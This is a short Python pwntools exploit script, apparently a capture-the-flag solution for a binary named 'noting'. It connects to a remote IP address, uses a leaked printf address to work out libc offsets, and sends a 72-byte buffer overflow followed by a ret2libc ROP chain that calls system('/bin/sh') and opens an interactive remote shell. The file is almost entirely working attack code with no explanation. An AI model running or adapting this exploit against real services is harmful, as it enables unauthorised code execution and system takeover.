#!usr/bin/env/python3

from pwn import *

#offset = 72

# context.log_level = "DEBUG"

elf = ELF('./noting')
libc = ELF('libc.so.6')
# p = elf.process()

# gs = '''
# '''

# gdb.attach(p,gdbscript=gs)

p = remote("34.30.126.104",5000)

p.recvuntil("at ")

printf = int(p.recvline().decode(),16)

print(f"Printf is at: {hex(printf)}")

printf_offset = 0x56250
libc_base = printf - printf_offset

print(f"Libc Base is at: {hex(libc_base)}")

system_offset = 0x4f760
system_address = libc_base + system_offset
print(f"System is at: {hex(system_address)}")

# bin_sh_offset = 0x19fe34 #Chutiya hoon main
# bin_sh_address = libc_base + bin_sh_offset

# print(f"Bin/sh is at: {hex(bin_sh_address)}")

bin_sh_address = libc_base + next(libc.search(b'/bin/sh'))
print(f"Bin/sh is at: {hex(bin_sh_address)}")

pop_rdi_offset = 0x28265
pop_rdi_address = libc_base + pop_rdi_offset
print(f"POP RDI is at: {hex(pop_rdi_address)}")

#main = 0x0000000040128f

ret = 0x000000000040101a

buf = b"A" * 72
buf += p64(pop_rdi_address)
buf += p64(bin_sh_address)
buf += p64(ret) #stack allignment shit
buf += p64(system_address)



print(p.recvline())
print(p.recvline())
p.sendline(b"120")
print(p.recvline())
p.sendline(buf)

p.interactive()